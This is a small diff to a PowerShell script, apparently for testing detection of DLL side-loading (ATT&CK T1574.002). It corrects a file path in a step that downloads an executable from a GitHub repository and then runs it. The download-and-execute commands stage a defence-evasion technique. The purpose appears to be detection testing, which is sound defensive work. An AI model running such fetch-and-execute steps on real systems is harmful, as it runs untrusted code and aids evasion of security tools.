@@ -8,4 +8,4 @@ Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Te
 Invoke-WebRequest "https://raw.githubusercontent.com/SecurIT360/TTP-Detection-Testing/main/T1574.002/MpCmdRun.exe" -OutFile "c:\Users\$env:USERNAME\Desktop\DLL-Sideloading\MpCmdRun.exe"
 
 # Execute
-& "c:\$env:USERNAME\Desktop\DLL-Sideloading\MpCmdRun.exe"
+& "c:\Users\$env:USERNAME\Desktop\DLL-Sideloading\MpCmdRun.exe"
